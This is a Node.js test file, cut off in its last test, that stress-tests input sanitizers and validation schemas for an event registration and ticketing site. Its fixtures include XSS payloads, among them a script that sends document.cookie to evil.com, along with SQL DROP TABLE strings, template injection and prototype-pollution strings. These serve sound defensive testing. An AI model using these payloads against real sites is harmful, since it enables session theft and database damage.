/**
 * Input Forms Stress Tests
 *
 * Covers every non-payment input field across the site at volume.
 *
 * Area  1 – Email fields       (registration, speaker, volunteer, media, newsletter, contact, lookup)
 * Area  2 – Short-text fields  (first/last name, org, role, topic, city, country, designation)
 * Area  3 – Message/textarea   (pitch, motivation, attendance_reason, contact message, reviewNotes)
 * Area  4 – Phone fields       (registration, volunteer ticket lookup)
 * Area  5 – URL field          (linkedin_url in registration form)
 * Area  6 – Full registration payload normalization
 * Area  7 – Admin registration status & attendee-category selects
 * Area  8 – Ticket lookup Zod schema (public /tickets page)
 * Area  9 – Ticket event Zod schema (admin ops console — non-payment)
 * Area 10 – Chatbot message array shape
 * Area 11 – Cross-sanitizer injection resistance
 */

'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const { pathToFileURL } = require('node:url');
const { performance } = require('node:perf_hooks');
const { register } = require('node:module');

// ─── @/ alias resolver: maps @/lib/foo → src/lib/foo.js ─────────────────────
// Needed for registration-utils.js and ticketing-validation.js
const SRC_ROOT = pathToFileURL(path.join(__dirname, '..', 'src')).href + '/';
register(
  `data:text/javascript,
    const root = ${JSON.stringify(SRC_ROOT)};
    export async function resolve(specifier, context, nextResolve) {
      if (specifier.startsWith('@/')) {
        let target = root + specifier.slice(2);
        if (!target.endsWith('.js') && !target.endsWith('.ts')) target += '.js';
        return nextResolve(target, context);
      }
      return nextResolve(specifier, context);
    }
  `,
  { parentURL: pathToFileURL(__filename).href }
);

async function importModule(relativePath) {
  const url = pathToFileURL(path.join(__dirname, '..', relativePath)).href;
  return import(url);
}

// ══════════════════════════════════════════════════════════════════════════════
// AREA 1 — EMAIL FIELDS
// Covers: registration, speaker, volunteer, media, newsletter, contact, lookup
// ══════════════════════════════════════════════════════════════════════════════

test('sanitizeEmail lowercases and strips whitespace across 10,000 inputs', async () => {
  const { sanitizeEmail } = await importModule('src/lib/input-sanitizers.js');
  const templates = [
    (i) => `  User${i}@Example.COM  `,
    (i) => `\tBOB.${i}@DOMAIN.CO.IN\n`,
    (i) => `user+tag${i}@Sub.Domain.ORG`,
    (i) => `NAME_${i}@TEST.NET`,
    (i) => `  ADMIN.${i}@COMPANY.IN\t `,
  ];
  const N = 10_000;
  const start = performance.now();
  for (let i = 0; i < N; i++) {
    const raw = templates[i % templates.length](i);
    const result = sanitizeEmail(raw);
    assert.equal(result, result.toLowerCase(), `not lowercased at ${i}`);
    assert.ok(!result.match(/\s/), `whitespace survived at ${i}: "${result}"`);
  }
  const ms = performance.now() - start;
  assert.ok(
    ms < 1000,
    `sanitizeEmail: ${N} calls took ${ms.toFixed(0)} ms (limit 1 s)`
  );
});

test('isValidEmail accepts 5,000 structurally valid email addresses', async () => {
  const { isValidEmail } = await importModule('src/lib/input-sanitizers.js');
  const domains = [
    'gmail.com',
    'yahoo.co.in',
    'company.org',
    'university.edu',
    'tasi.org.in',
  ];
  for (let i = 0; i < 5_000; i++) {
    const email = `user${i}@${domains[i % domains.length]}`;
    assert.equal(isValidEmail(email), true, `should accept: ${email}`);
  }
});

test('isValidEmail rejects 5,000 malformed email patterns', async () => {
  const { isValidEmail } = await importModule('src/lib/input-sanitizers.js');
  const invalids = [
    (i) => `noatsign${i}`,
    (i) => `double@@sign${i}.com`,
    (i) => `@nodomain${i}`,
    () => ''.padEnd(65, 'a') + '@domain.com', // local > 64 chars
    () => 'x@' + 'a'.repeat(256), // domain > 255 chars
    (i) => `user${i}@.leadingdot.com`,
    (i) => `user${i}@trailingdot.`,
    () => '',
    () => '   ',
    (i) => `missing.tld.${i}@`,
  ];
  for (let i = 0; i < 5_000; i++) {
    const email = invalids[i % invalids.length](i);
    assert.equal(
      isValidEmail(email),
      false,
      `should reject: ${JSON.stringify(email)}`
    );
  }
});

test('isValidEmail enforces length boundaries precisely', async () => {
  const { isValidEmail } = await importModule('src/lib/input-sanitizers.js');
  // local part: exactly 64 = valid, 65 = invalid
  assert.equal(
    isValidEmail('a'.repeat(64) + '@mail.com'),
    true,
    'local 64 should pass'
  );
  assert.equal(
    isValidEmail('a'.repeat(65) + '@mail.com'),
    false,
    'local 65 should fail'
  );
  // domain part: exactly 255 = valid, 256 = invalid
  // 'a' + '@' + domain → total must stay ≤ 320
  assert.equal(
    isValidEmail('a@' + 'b'.repeat(251) + '.com'),
    true,
    'domain 255 should pass'
  );
  assert.equal(
    isValidEmail('a@' + 'b'.repeat(256)),
    false,
    'domain 256 should fail'
  );
  // total length > 320 fails
  assert.equal(
    isValidEmail('a'.repeat(64) + '@' + 'b'.repeat(252) + '.com'), // 64+1+256=321
    false,
    '321-char email should fail'
  );
  // domain starting or ending with dot
  assert.equal(
    isValidEmail('x@.domain.com'),
    false,
    'domain leading dot should fail'
  );
  assert.equal(
    isValidEmail('x@domain.'),
    false,
    'domain trailing dot should fail'
  );
});

test('sanitizeEmail neutralizes XSS and injection content in email fields', async () => {
  const { sanitizeEmail } = await importModule('src/lib/input-sanitizers.js');
  const payloads = [
    '<script>alert(1)</script>@evil.com',
    '"><img src=x onerror=alert(1)>@evil.com',
    "'; DROP TABLE users;--@evil.com",
    '\x00\x01\x1F\x7F@evil.com',
    'javascript:alert(1)@evil.com',
  ];
  for (let i = 0; i < 1000; i++) {
    const raw = payloads[i % payloads.length];
    const result = sanitizeEmail(raw);
    // Control bytes must not survive
    for (let cp = 0x00; cp <= 0x1f; cp++) {
      assert.ok(
        !result.includes(String.fromCharCode(cp)),
        `Control byte 0x${cp.toString(16)} survived in "${result}"`
      );
    }
    assert.ok(!result.includes('\x7F'), `DEL byte survived`);
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// AREA 2 — SHORT-TEXT FIELDS
// Covers: first_name, last_name, organization, designation, role, topic, city,
//         country — across registration, speaker, volunteer, admin forms
// ══════════════════════════════════════════════════════════════════════════════

test('sanitizeShortText strips HTML tags across 10,000 name/org/city inputs', async () => {
  const { sanitizeShortText } = await importModule(
    'src/lib/input-sanitizers.js'
  );
  const payloads = [
    '<b>John</b>',
    '<script>alert("xss")</script>Acme',
    '<img src=x onerror=alert(1)>',
    '<!-- comment --> Delhi',
    '<a href="javascript:void(0)">Click</a>',
    '<style>body{display:none}</style>',
  ];
  const N = 10_000;
  const start = performance.now();
  for (let i = 0; i < N; i++) {
    const result = sanitizeShortText(payloads[i % payloads.length], {
      maxLength: 255,
      required: false,
    });
    assert.ok(!result.includes('<'), `< survived: "${result}"`);
    assert.ok(!result.includes('>'), `> survived: "${result}"`);
  }
  const ms = performance.now() - start;
  assert.ok(ms < 1000, `HTML strip: ${N} calls took ${ms.toFixed(0)} ms`);
});

test('sanitizeShortText enforces maxLength for all field sizes (80/120/160/180/255)', async () => {
  const { sanitizeShortText } = await importModule(
    'src/lib/input-sanitizers.js'
  );
  const maxLengths = [80, 120, 160, 180, 255];
  let total = 0;
  for (const maxLength of maxLengths) {
    for (let i = 0; i < 1_000; i++) {
      assert.throws(
        () =>
          sanitizeShortText('A'.repeat(maxLength + 1), {
            maxLength,
            fieldName: 'Test',
          }),
        /must be .* characters or fewer/i
      );
      // One char under limit passes
      const ok = sanitizeShortText('A'.repeat(maxLength), {
        maxLength,
        fieldName: 'Test',
      });
      assert.equal(ok.length, maxLength);
      total++;
    }
  }
  assert.equal(total, 5_000);
});

test('sanitizeShortText throws for all empty-value patterns on required fields', async () => {
  const { sanitizeShortText } = await importModule(
    'src/lib/input-sanitizers.js'
  );
  const fieldNames = [
    'First name',
    'Last name',
    'Organization',
    'Designation',
    'City',
    'Country',
    'Topic',
    'Role',
    'Availability',
    'Interest area',
  ];
  const emptyValues = ['', '   ', '\t', '\n', '\r\n', null, undefined];
  for (const fieldName of fieldNames) {
    for (const val of emptyValues) {
      assert.throws(
        () =>
          sanitizeShortText(val, { maxLength: 80, fieldName, required: true }),
        /is required/i,
        `"${fieldName}" should throw for ${JSON.stringify(val)}`
      );
    }
  }
});

test('sanitizeShortText collapses internal whitespace across 5,000 org/city inputs', async () => {
  const { sanitizeShortText } = await importModule(
    'src/lib/input-sanitizers.js'
  );
  for (let i = 0; i < 5_000; i++) {
    const result = sanitizeShortText(`Acme   Corp   Ltd  ${i}`, {
      maxLength: 255,
    });
    assert.ok(!/\s{2,}/.test(result), `Multi-space not collapsed: "${result}"`);
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// AREA 3 — MESSAGE / TEXTAREA FIELDS
// Covers: pitch (speaker), motivation (volunteer), attendance_reason (registration),
//         message (contact), reviewNotes (admin)
// ══════════════════════════════════════════════════════════════════════════════

test('sanitizeMessage strips HTML/script injection from 10,000 textarea submissions', async () => {
  const { sanitizeMessage } = await importModule('src/lib/input-sanitizers.js');
  const xssMessages = [
    '<script>fetch("https://evil.com?c="+document.cookie)</script> I want to attend.',
    '<img src=x onerror="document.location=\'http://evil.com\'">\nMy motivation is growth.',
    '<!-- INJECTED -->Please consider my application.',
    '<style>body{display:none}</style>Pitch text here.',
    'My message includes <b>bold</b> and <a href="javascript:void(0)">link</a>.',
    '<svg/onload=alert(1)>Normal content follows.',
  ];
  const N = 10_000;
  const start = performance.now();
  for (let i = 0; i < N; i++) {
    const result = sanitizeMessage(xssMessages[i % xssMessages.length]);
    assert.ok(!result.includes('<'), `< delimiter survived at ${i}`);
    assert.ok(!result.includes('>'), `> delimiter survived at ${i}`);
    assert.ok(!result.includes('<script'), `<script> not stripped at ${i}`);
    assert.ok(!result.includes('<img'), `<img> not stripped at ${i}`);
    assert.ok(!result.includes('<style'), `<style> not stripped at ${i}`);
    assert.ok(!result.includes('<!--'), `<!-- not stripped at ${i}`);
    assert.ok(!result.includes('<svg'), `<svg> not stripped at ${i}`);
  }
  const ms = performance.now() - start;
  assert.ok(ms < 1000, `sanitizeMessage: ${N} calls took ${ms.toFixed(0)} ms`);
});

test('sanitizeMessage collapses triple+ newlines across 5,000 pitch/motivation inputs', async () => {
  const { sanitizeMessage } = await importModule('src/lib/input-sanitizers.js');
  const multilineInputs = [
    `Para one\n\n\n\n\nPara two\n\n\n\nPara three`,
    `Line1\r\nLine2\r\r\nLine3`,
    `First\n\n\nSecond\n\n\n\n\n\nThird`,
  ];
  for (let i = 0; i < 5_000; i++) {
    const result = sanitizeMessage(multilineInputs[i % multilineInputs.length]);
    assert.ok(
      !/\n{3,}/.test(result),
      `Triple newline survived: ${JSON.stringify(result)}`
    );
  }
});

test('sanitizeMessage strips control characters from user messages', async () => {
  const { sanitizeMessage } = await importModule('src/lib/input-sanitizers.js');
  for (const [cp, name] of [
    [0x00, 'NUL'],
    [0x01, 'SOH'],
    [0x08, 'BS'],
    [0x0d, 'CR'],
    [0x1b, 'ESC'],
    [0x7f, 'DEL'],
  ]) {
    const input = `Before${String.fromCharCode(cp)}After`;
    const result = sanitizeMessage(input);
    assert.ok(
      !result.includes(String.fromCharCode(cp)),
      `Control char ${name} (0x${cp.toString(16)}) survived`
    );
  }
});

test('sanitizeMessage handles max-length (5,000-char) textarea values at volume', async () => {
  const { sanitizeMessage } = await importModule('src/lib/input-sanitizers.js');
  const longMsg =
    'A'.repeat(4000) + '\n\n' + 'B'.repeat(900) + '<script>x</script>';
  const N = 1_000;
  const start = performance.now();
  for (let i = 0; i < N; i++) {
    const result = sanitizeMessage(longMsg);
    assert.ok(
      !result.includes('<script'),
      'script tag survived in long message'
    );
  }
  const ms = performance.now() - start;
  assert.ok(ms < 500, `${N} max-length sanitizations took ${ms.toFixed(0)} ms`);
});

// ══════════════════════════════════════════════════════════════════════════════
// AREA 4 — PHONE FIELDS
// Covers: registration form, volunteer form, ticket lookup form
// ══════════════════════════════════════════════════════════════════════════════

test('sanitizePhone strips script and special chars from 10,000 phone inputs', async () => {
  const { sanitizePhone } = await importModule('src/lib/input-sanitizers.js');
  const inputs = [
    '+91 98765 43210',
    '(022) 4000-1234',
    '+1-800-555-0100',
    '91 ext 23',
    '+44.20.7946.0958',
    '<script>alert(1)</script>+91234',
    '&&9876543210@@',
    '   +91  9876  5432  10   ',
    "`'; DROP TABLE registrations;--",
    '${7*7}9876543210',
  ];
  const N = 10_000;
  const start = performance.now();
  for (let i = 0; i < N; i++) {
    const result = sanitizePhone(inputs[i % inputs.length]);
    assert.ok(!result.includes('<'), `< survived in phone: "${result}"`);
    assert.ok(!result.includes('>'), `> survived in phone: "${result}"`);
    assert.ok(!result.includes('&'), `& survived in phone: "${result}"`);
    assert.ok(!result.includes('$'), `$ survived in phone: "${result}"`);
    assert.ok(!result.includes(';'), `; survived in phone: "${result}"`);
  }
  const ms = performance.now() - start;
  assert.ok(ms < 1000, `sanitizePhone: ${N} calls took ${ms.toFixed(0)} ms`);
});

// ══════════════════════════════════════════════════════════════════════════════
// AREA 5 — URL FIELD (linkedin_url in registration form)
// ══════════════════════════════════════════════════════════════════════════════

test('sanitizeUrl strips whitespace from 5,000 LinkedIn URL inputs', async () => {
  const { sanitizeUrl } = await importModule('src/lib/input-sanitizers.js');
  const urlInputs = [
    '  https://www.linkedin.com/in/john-doe  ',
    '\thttps://linkedin.com/in/janedoe\n',
    '  linkedin.com/in/bob  ',
    '\r\nhttps://linkedin.com/in/alice\r\n',
    '   https://in.linkedin.com/in/ravi-sharma   ',
  ];
  for (let i = 0; i < 5_000; i++) {
    const result = sanitizeUrl(urlInputs[i % urlInputs.length]);
    assert.ok(!result.startsWith(' '), `Leading space in URL at ${i}`);
    assert.ok(!result.endsWith(' '), `Trailing space in URL at ${i}`);
    assert.ok(!result.includes('\t'), `Tab in URL at ${i}`);
    assert.ok(!result.includes('\n'), `Newline in URL at ${i}`);
    assert.ok(!result.includes('\r'), `CR in URL at ${i}`);
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// AREA 6 — FULL REGISTRATION FORM PAYLOAD
// Covers the entire registration form end-to-end
// ══════════════════════════════════════════════════════════════════════════════

test('normalizeRegistrationPayload processes 500 valid payloads without error', async () => {
  const { normalizeRegistrationPayload } = await importModule(
    'src/lib/registration-utils.js'
  );
  const categories = [
    'Government',
    'Tech',
    'NGO',
    'Academia',
    'Media',
    'Student',
    'Other',
  ];
  const cities = [
    'Mumbai',
    'Delhi',
    'Bangalore',
    'Chennai',
    'Hyderabad',
    'Pune',
  ];
  const start = performance.now();
  for (let i = 0; i < 500; i++) {
    const result = normalizeRegistrationPayload({
      first_name: `FirstName${i}`,
      last_name: `LastName${i}`,
      email: `user${i}@testdomain.org`,
      phone: `+91 9${String(i).padStart(9, '0')}`,
      organization: `Org ${i} Inc`,
      designation: `Role ${i}`,
      attendee_category: categories[i % categories.length],
      city: cities[i % cities.length],
      country: 'India',
      linkedin_url: `https://linkedin.com/in/user${i}`,
      attendance_reason:
        i % 3 === 0
          ? `Reason ${i}: I am deeply interested in trust and safety`
          : '',
    });
    assert.ok(result.first_name.length > 0, `first_name empty at ${i}`);
    assert.equal(result.email, `user${i}@testdomain.org`);
    assert.ok(
      result.linkedin_url.startsWith('https://'),
      `LinkedIn not normalised at ${i}`
    );
    assert.ok(
      categories.includes(result.attendee_category),
      `attendee_category invalid at ${i}`
    );
  }
  const ms = performance.now() - start;
  assert.ok(ms < 5000, `500 payload normalizations took ${ms.toFixed(0)} ms`);
});

test('normalizeRegistrationPayload rejects all empty patterns for each required field', async () => {
  const { normalizeRegistrationPayload } = await importModule(
    'src/lib/registration-utils.js'
  );
  const validBase = {
    first_name: 'Alice',
    last_name: 'Smith',
    email: 'alice@example.com',
    phone: '+91 9876543210',
    organization: 'Acme',
    designation: 'Engineer',
    attendee_category: 'Tech',
    city: 'Delhi',
    country: 'India',
    linkedin_url: 'https://linkedin.com/in/alice',
  };
  const requiredTextFields = [
    'first_name',
    'last_name',
    'organization',
    'designation',
    'city',
    'country',
  ];
  for (const field of requiredTextFields) {
    for (const empty of [undefined, '', '   ', '\t\n']) {
      assert.throws(
        () => normalizeRegistrationPayload({ ...validBase, [field]: empty }),
        /is required/i,
        `Should throw for "${field}" = ${JSON.stringify(empty)}`
      );
    }
  }
});

test('normalizeRegistrationPayload rejects non-LinkedIn and malformed URLs', async () => {
  const { normalizeRegistrationPayload } = await importModule(
    'src/lib/registration-utils.js'
  );
  const validBase = {
    first_name: 'Alice',
    last_name: 'Smith',
    email: 'alice@example.com',
    phone: '+91 9876543210',
    organization: 'Acme',
    designation: 'Engineer',
    attendee_category: 'Tech',
    city: 'Delhi',
    country: 'India',
  };
  const badUrls = [
    '',
    '   ',
    'https://twitter.com/alice',
    'https://facebook.com/in/alice',
    'not-a-url',
    'https://evil.com/linkedin.com/in/alice',
    'https://linkedin.com.evil.example/in/alice',
    'ftp://linkedin.com/in/alice',
  ];
  for (const url of badUrls) {
    assert.throws(
      () => normalizeRegistrationPayload({ ...validBase, linkedin_url: url }),
      /linkedin/i,
      `Should throw for bad LinkedIn URL: ${JSON.stringify(url)}`
    );
  }
});

test('normalizeRegistrationPayload rejects phone numbers outside the 7–32 char window', async () => {
  const { normalizeRegistrationPayload } = await importModule(
    'src/lib/registration-utils.js'
  );
  const validBase = {
    first_name: 'Alice',
    last_name: 'Smith',
    email: 'alice@example.com',
    organization: 'Acme',
    designation: 'Engineer',
    attendee_category: 'Tech',
    city: 'Delhi',
    country: 'India',
    linkedin_url: 'https://linkedin.com/in/alice',
  };
  const badPhones = [
    '', // empty
    '12345', // 5 chars — too short
    '9'.repeat(33), // too long after sanitization
  ];
  for (const phone of badPhones) {
    assert.throws(
      () => normalizeRegistrationPayload({ ...validBase, phone }),
      /phone/i,
      `Should throw for phone: ${JSON.stringify(phone)}`
    );
  }
});

test('normalizeRegistrationPayload attendance_reason is rejected when over 2,000 chars', async () => {
  const { normalizeRegistrationPayload } = await importModule(
    'src/lib/registration-utils.js'
  );
  const validBase = {
    first_name: 'Alice',
    last_name: 'Smith',
    email: 'alice@example.com',
    phone: '+91 9876543210',
    organization: 'Acme',
    designation: 'Engineer',
    attendee_category: 'Tech',
    city: 'Delhi',
    country: 'India',
    linkedin_url: 'https://linkedin.com/in/alice',
  };
  assert.throws(
    () =>
      normalizeRegistrationPayload({
        ...validBase,
        attendance_reason: 'X'.repeat(2001),
      }),
    /2000/
  );
  // Exactly 2000 chars passes
  const ok = normalizeRegistrationPayload({
    ...validBase,
    attendance_reason: 'X'.repeat(2000),
  });
  assert.ok(
    ok.attendance_reason?.length === 2000,
    '2000-char reason should be kept'
  );
});

// ══════════════════════════════════════════════════════════════════════════════
// AREA 7 — ADMIN SELECTS
// Covers: registration status dropdown, attendee-category
// ══════════════════════════════════════════════════════════════════════════════

test('normalizeRegistrationStatus accepts all 4 valid statuses and rejects everything else', async () => {
  const { normalizeRegistrationStatus } = await importModule(
    'src/lib/registration-utils.js'
  );
  const valid = ['pending', 'confirmed', 'waitlisted', 'rejected'];
  const invalid = [
    'approved',
    'active',
    'blocked',
    'CONFIRMED',
    'Pending',
    '',
    '   ',
    undefined,
    null,
    '<script>alert(1)</script>',
    'pending; DROP TABLE event_registrations;--',
  ];
  for (const s of valid) {
    assert.equal(normalizeRegistrationStatus(s), s, `should accept: "${s}"`);
  }
  for (const s of invalid) {
    assert.throws(
      () => normalizeRegistrationStatus(s),
      /invalid/i,
      `should reject: ${JSON.stringify(s)}`
    );
  }
});

test('normalizeCategory accepts all 7 attendee categories and rejects everything else', async () => {
  const { normalizeCategory } = await importModule(
    'src/lib/registration-utils.js'
  );
  const valid = [
    'Government',
    'Tech',
    'NGO',
    'Academia',
    'Media',
    'Student',
    'Other',
  ];
  const invalid = [
    'celebrity',
    'Investor',
    'VIP',
    '',
    undefined,
    null,
    'TECH',
    'tech',
    'speaker',
    '<script>celebrity</script>', // strips to 'celebrity' → not in list
    '{{Tech}}',
  ];
  for (const cat of valid) {
    assert.equal(normalizeCategory(cat), cat, `should accept: "${cat}"`);
  }
  for (const cat of invalid) {
    assert.throws(
      () => normalizeCategory(cat),
      /category/i,
      `should reject: ${JSON.stringify(cat)}`
    );
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// AREA 8 — TICKET LOOKUP FORM (public /tickets page)
// Fields: email + phone
// ══════════════════════════════════════════════════════════════════════════════

test('festivalTicketLookupSchema validates 2,000 valid email+phone pairs', async () => {
  const { festivalTicketLookupSchema } = await importModule(
    'src/lib/festival-ticketing-validation.js'
  );
  const phones = ['+91 9876543210', '+1-800-555-0123', '+44 20 7946 0958'];
  const domains = ['gmail.com', 'outlook.com', 'yahoo.com', 'company.org'];
  const N = 2_000;
  const start = performance.now();
  for (let i = 0; i < N; i++) {
    const res = festivalTicketLookupSchema.safeParse({
      email: `user${i}@${domains[i % domains.length]}`,
      phone: phones[i % phones.length],
    });
    assert.equal(
      res.success,
      true,
      `valid pair ${i} failed: ${JSON.stringify(res.error)}`
    );
  }
  const ms = performance.now() - start;
  assert.ok(ms < 2000, `2,000 lookup validations took ${ms.toFixed(0)} ms`);
});

test('festivalTicketLookupSchema rejects 1,000 invalid email patterns', async () => {
  const { festivalTicketLookupSchema } = await importModule(
    'src/lib/festival-ticketing-validation.js'
  );
  const badEmails = [
    'notanemail',
    '@nodomain.com',
    'two@@at.com',
    '',
    'missing.tld@',
    'spaces in@email.com',
  ];
  for (let i = 0; i < 1_000; i++) {
    const res = festivalTicketLookupSchema.safeParse({
      email: badEmails[i % badEmails.length],
      phone: '+91 9876543210',
    });
    assert.equal(
      res.success,
      false,
      `should reject: "${badEmails[i % badEmails.length]}"`
    );
  }
});

test('festivalTicketLookupSchema rejects 1,000 invalid phone formats', async () => {
  const { festivalTicketLookupSchema } = await importModule(
    'src/lib/festival-ticketing-validation.js'
  );
  const badPhones = [
    '123', // too short (< 7 digits)
    'abcdefgh', // letters only
    '12345', // 5 chars < 7
    '++9876543210', // double + prefix
    'not-a-phone',
    'ABCDEFGHIJK', // 11 alpha chars
  ];
  for (let i = 0; i < 1_000; i++) {
    const res = festivalTicketLookupSchema.safeParse({
      email: 'valid@example.com',
      phone: badPhones[i % badPhones.length],
    });
    assert.equal(
      res.success,
      false,
      `should reject phone: "${badPhones[i % badPhones.length]}"`
    );
  }
});

test('festivalTicketLookupSchema rejects phones longer than 30 chars', async () => {
  const { festivalTicketLookupSchema } = await importModule(
    'src/lib/festival-ticketing-validation.js'
  );
  const longPhone = '+91 ' + '9'.repeat(28); // 32 chars > 30 limit
  const res = festivalTicketLookupSchema.safeParse({
    email: 'user@example.com',
    phone: longPhone,
  });
  assert.equal(res.success, false, 'phone > 30 chars should fail');
});

// ══════════════════════════════════════════════════════════════════════════════
// AREA 9 — TICKET EVENT FORM (admin ops console — non-payment fields)
// Fields: slug, title, description, venue, startsAt, endsAt, timezone, status,
//         ticketType.name, ticketType.tierKey, ticketType.capacity
// ══════════════════════════════════════════════════════════════════════════════

test('createTicketEventSchema validates 500 valid event payloads across all 3 ticket modes', async () => {
  const { createTicketEventSchema } = await importModule(
    'src/lib/ticketing-validation.js'
  );
  const modes = ['free', 'paid', 'donation'];
  const statuses = ['draft', 'published', 'archived'];
  const N = 500;
  const start = performance.now();
  for (let i = 0; i < N; i++) {
    const mode = modes[i % 3];
    const res = createTicketEventSchema.safeParse({
      slug: `event-slug-${i}`,
      title: `Event Title ${i}`,
      description: `A description for event number ${i}.`,
      venue: `Conference Hall ${i % 10}`,
      startsAt: '2026-10-14T09:00:00.000Z',
      endsAt: '2026-10-15T18:00:00.000Z',
      timezone: 'Asia/Kolkata',
      status: statuses[i % 3],
      ticketTypes: [
        {
          tierKey: `tier-${i}`,
          name: `Tier ${i}`,
          ticketMode: mode,
          pricePaise: mode === 'paid' ? 100_000 : null,
          minDonationPaise: mode === 'donation' ? 5_000 : null,
          capacity: 100 + i,
        },
      ],
    });
    assert.equal(
      res.success,
      true,
      `valid event ${i} failed: ${JSON.stringify(res.error?.issues)}`
    );
  }
  const ms = performance.now() - start;
  assert.ok(ms < 3000, `500 event schema validations took ${ms.toFixed(0)} ms`);
});

test('createTicketEventSchema rejects invalid slug, title, description, and date values', async () => {
  const { createTicketEventSchema } = await importModule(
    'src/lib/ticketing-validation.js'
  );
  const freeTicket = {
    tierKey: 'base',
    name: 'Base Tier',
    ticketMode: 'free',
    capacity: 100,
  };
  const validBase = {
    slug: 'valid-event',
    title: 'Valid Event Title',
    startsAt: '2026-10-14T09:00:00.000Z',
    timezone: 'Asia/Kolkata',
    ticketTypes: [freeTicket],
  };
  const invalidCases = [
    { ...validBase, slug: 'ab' }, // slug < 3 chars
    { ...validBase, slug: 'a'.repeat(121) }, // slug > 120 chars
    { ...validBase, title: 'Ti' }, // title < 3 chars
    { ...validBase, title: 'T'.repeat(201) }, // title > 200 chars
    { ...validBase, description: 'D'.repeat(4001) }, // description > 4000 chars
    { ...validBase, venue: 'V'.repeat(201) }, // venue > 200 chars
    { ...validBase, startsAt: 'not-a-date' }, // invalid ISO
    { ...validBase, startsAt: '' }, // empty date
    { ...validBase, timezone: 'XY' }, // timezone < 3 chars
    { ...validBase, timezone: 'T'.repeat(81) }, // timezone > 80 chars
    { ...validBase, status: 'active' }, // invalid status enum
    { ...validBase, status: 'DRAFT' }, // wrong case
    { ...validBase, ticketTypes: [] }, // no ticket types (min 1)
  ];
  for (const input of invalidCases) {
    const res = createTicketEventSchema.safeParse(input);
    assert.equal(res.success, false, `Should fail: ${JSON.stringify(input)}`);
  }
});

test('createTicketEventSchema enforces ticket-type field constraints', async () => {
  const { createTicketEventSchema } = await importModule(
    'src/lib/ticketing-validation.js'
  );
  const eventBase = {
    slug: 'test-event',
    title: 'Test Event',
    startsAt: '2026-10-14T09:00:00.000Z',
    timezone: 'Asia/Kolkata',
  };
  // paid ticket with no pricePaise
  assert.equal(
    createTicketEventSchema.safeParse({
      ...eventBase,
      ticketTypes: [
        {
          tierKey: 'vip',
          name: 'VIP',
          ticketMode: 'paid',
          capacity: 50,
          pricePaise: null,
        },
      ],
    }).success,
    false,
    'paid ticket without pricePaise should fail'
  );
  // donation ticket with no minDonationPaise
  assert.equal(
    createTicketEventSchema.safeParse({
      ...eventBase,
      ticketTypes: [
        {
          tierKey: 'don',
          name: 'Donation',
          ticketMode: 'donation',
          capacity: 50,
          minDonationPaise: null,
        },
      ],
    }).success,
    false,
    'donation ticket without minDonationPaise should fail'
  );
  // more than 10 ticket types
  const tooMany = Array.from({ length: 11 }, (_, i) => ({
    tierKey: `tier${i}`,
    name: `Tier ${i}`,
    ticketMode: 'free',
    capacity: 10,
  }));
  assert.equal(
    createTicketEventSchema.safeParse({ ...eventBase, ticketTypes: tooMany })
      .success,
    false,
    '> 10 ticket types should fail'
  );
  // tierKey too short
  assert.equal(
    createTicketEventSchema.safeParse({
      ...eventBase,
      ticketTypes: [
        { tierKey: 'x', name: 'Short Key', ticketMode: 'free', capacity: 50 },
      ],
    }).success,
    false,
    'tierKey < 2 chars should fail'
  );
  // capacity must be ≥ 0
  assert.equal(
    createTicketEventSchema.safeParse({
      ...eventBase,
      ticketTypes: [
        { tierKey: 'base', name: 'Base', ticketMode: 'free', capacity: -1 },
      ],
    }).success,
    false,
    'negative capacity should fail'
  );
  // perOrderLimit max 20
  assert.equal(
    createTicketEventSchema.safeParse({
      ...eventBase,
      ticketTypes: [
        {
          tierKey: 'base',
          name: 'Base',
          ticketMode: 'free',
          capacity: 100,
          perOrderLimit: 21,
        },
      ],
    }).success,
    false,
    'perOrderLimit > 20 should fail'
  );
});

// ══════════════════════════════════════════════════════════════════════════════
// AREA 10 — CHATBOT MESSAGE INPUT
// The /api/chat route validates: messages must be a non-null array
// ══════════════════════════════════════════════════════════════════════════════

test('chat input rejects 1,000 non-array message payloads and accepts 1,000 valid arrays', () => {
  // Mirrors the server-side guard in src/app/api/chat/route.ts
  function validateChatMessages(messages) {
    if (!messages || !Array.isArray(messages)) {
      throw new Error('messages must be an array');
    }
    return true;
  }

  const invalid = [
    null,
    undefined,
    '',
    0,
    {},
    'hello',
    42,
    false,
    NaN,
    Symbol('msg'),
  ];
  for (let i = 0; i < 1_000; i++) {
    assert.throws(
      () => validateChatMessages(invalid[i % invalid.length]),
      /must be an array/i
    );
  }

  for (let i = 0; i < 1_000; i++) {
    const arr = Array.from({ length: (i % 10) + 1 }, (_, j) => ({
      role: j % 2 === 0 ? 'user' : 'assistant',
      content: `Message ${j}: ${'x'.repeat(i % 50)}`,
    }));
    assert.equal(validateChatMessages(arr), true);
  }
});

test('chatbot message content is trimmed and non-empty before send (client-side guard)', () => {
  // Mirrors the trim-before-send guard in ChatBot.tsx
  function shouldSendMessage(input) {
    return typeof input === 'string' && input.trim().length > 0;
  }

  const empties = ['', '   ', '\t', '\n', '\r\n', '  \t  \n  '];
  for (const e of empties) {
    assert.equal(
      shouldSendMessage(e),
      false,
      `empty should be blocked: ${JSON.stringify(e)}`
    );
  }

  const valid = ['Hello', ' Question? ', 'What is trust and safety?', 'a'];
  for (const v of valid) {
    assert.equal(shouldSendMessage(v), true, `should allow: "${v}"`);
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// AREA 11 — CROSS-SANITIZER INJECTION RESISTANCE
// All sanitizers must handle adversarial input gracefully at volume
// ══════════════════════════════════════════════════════════════════════════════

test('all string sanitizers survive 2,000 prototype-pollution and injection payloads', async () => {
  const {
    sanitizeEmail,
    sanitizeMessage,
    sanitizeShortText,
    sanitizePhone,
    sanitizeUrl,
  } = await importModule('src/lib/input-sanitizers.js');

  const injections = [
    '__proto__[admin]=true',
    'constructor.prototype.isAdmin=true',
    '{"$gt":""}',
    '{{7*7}}',
    '${7*7}',
    '<svg/onload=alert(1)>',
    '`; DROP TABLE event_registrations;--',
    '\u202E reversed text',
    '\uFEFF zero-width no-break space',
    'null',
    'undefined',
    'NaN',
    'Infinity',
    '[object Object]',
    '\u0000\u0001\u001F',
  ];

  for (let i = 0; i < 2_000; i++) {
    const payload = injections[i % injections.length];
    assert.equal(typeof sanitizeEmail(payload), 'string');
